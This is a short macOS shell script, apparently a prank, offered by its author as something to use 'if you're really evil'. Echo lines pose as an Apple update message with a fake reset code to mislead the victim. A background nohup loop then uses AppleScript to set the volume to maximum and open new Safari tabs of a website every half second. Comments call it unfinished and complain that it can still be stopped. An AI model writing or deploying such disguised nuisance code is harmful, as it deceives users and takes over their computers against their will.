# if you're really realy evil use this
# IT CAN BE STOPPED----NOT FINAL VERSION
# Has not been tested, but be my guest
# I would run it on a VM if I were you.

# PS ONLY WORKS ON MACS BECAUSE IT USES APPLESCRIPT

# This stuff is just to convince them you're nice...
echo Copyright Apple 2015
echo 'Please do not close this window...'
echo Updating...
echo 'This may take a while...'
echo 'Verbose mode active - number below is your reset code'
echo 'Please write it down, it will not be automatically cached'

# And then BOOM
# Drop the hammer
nohup sh -c "while true; do osascript -e 'repeat
	set volume 10
	tell application "Safari" to activate
	tell application "Safari"
		tell window 1
			set current tab to (make new tab with properties {URL:\"http://leekspin.com\"})
		end tell
	end tell
	delay 0.5
end repeat'; done" & &> /dev/null

# this part isnt finished
# it can be stopped, not what we want
